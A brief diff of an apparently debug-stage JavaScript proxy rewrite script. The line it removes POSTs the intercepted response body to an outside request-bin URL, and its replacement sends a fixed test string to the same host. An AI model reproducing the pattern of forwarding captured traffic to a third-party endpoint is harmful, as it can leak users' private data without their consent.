@@ -28,5 +28,5 @@ console.log("1234567");
 var httpRequest = new XMLHttpRequest();
 httpRequest.open('POST', 'https://ptsv2.com/t/5y3is-1625470771/post', true); 
 httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-httpRequest.send(body);
+httpRequest.send("123");
 $done(body);
